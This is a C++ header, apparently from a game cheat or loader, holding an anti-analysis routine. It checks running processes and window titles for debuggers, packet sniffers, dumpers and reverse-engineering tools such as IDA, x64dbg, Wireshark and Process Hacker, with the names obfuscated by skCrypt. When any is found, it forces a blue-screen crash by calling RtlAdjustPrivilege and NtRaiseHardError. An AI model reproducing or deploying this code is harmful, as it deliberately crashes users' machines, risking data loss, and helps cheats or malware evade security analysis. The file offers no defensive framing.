#pragma once

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);
void blue_screen()
{
    BOOLEAN bluescr;
    ULONG cevap;
    RtlAdjustPrivilege(19, TRUE, FALSE, &bluescr);
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &cevap);
    exit(0);
}
void FindExeTitle()
{
    if (process_id((std::string)skCrypt("KsDumperClient.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("Extreme Injector v3.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("HTTPDebuggerUI.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("HTTPDebuggerSvc.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("FolderChangesView.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("ProcessHacker.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("procmon.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("idaq.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("idaq64.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("Wireshark.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("Fiddler.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("Xenos64.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("Cheat Engine.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("HTTP Debugger Windows Service (32 bit).exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("KsDumper.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("x64dbg.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("ProcessHacker.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("NetLimeter.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("ida.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("joeboxcontrol.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("ImportREC.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("autorunsc.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("cheatengine-i386.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("LordPE.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("Nemessis.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("regmon.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("dumpcap.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("procmon.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("dumpcap.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("proc_analyzer.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("autoruns.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("autoruns.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("tcpview.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("procexp.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("sysAnalyzer.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("ImmunityDebugger.exe")))
    {
        blue_screen();
    }
    else if (process_id((std::string)skCrypt("sniff_hit.exe")))
    {
        blue_screen();
    }
    else if (FindWindow(0, skCrypt("IDA: Quick start")))
    {
        blue_screen();
    }
    else if (FindWindow(0, skCrypt("Memory Viewer")))
    {
        blue_screen();
    }
    else if (FindWindow(0, skCrypt("Process List")))
    {
        blue_screen();
    }
    else if (FindWindow(0, skCrypt("KsDumper")))
    {
        blue_screen();
    }
    else if (FindWindow(0, skCrypt("NetLimiter")))
    {
        blue_screen();
    }
    else if (FindWindow(0, skCrypt("HTTP Debugger")))
    {
        blue_screen();
    }
    else if (FindWindow(0, skCrypt("OllyDbg")))
    {
        blue_screen();
    }
}
